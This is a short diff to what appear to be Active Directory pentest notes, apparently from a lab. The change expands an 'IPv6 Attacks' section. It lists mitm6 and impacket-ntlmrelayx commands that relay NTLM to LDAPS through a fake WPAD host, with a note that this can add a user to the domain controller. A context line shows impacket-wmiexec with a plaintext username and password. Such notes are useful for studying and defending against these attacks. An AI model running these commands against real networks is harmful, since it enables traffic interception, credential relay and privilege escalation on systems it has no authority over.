@@ -33,7 +33,8 @@ impacket-wmiexec kernel.local/aliakbari:p@ssword1@192.168.127.242
 ```
 
 ## IPv6 Attacks
-Will enumerate the DC for good information :
+- Will enumerate the DC for good information
+- Can add a normal user to DC with admin credentials
 
 1. `mitm6 -i eth1 -d kernel.local`
 2. `impacket-ntlmrelayx -6 -t ldaps://192.168.127.248 -wh fakewpad.kernel.local -l lootme`
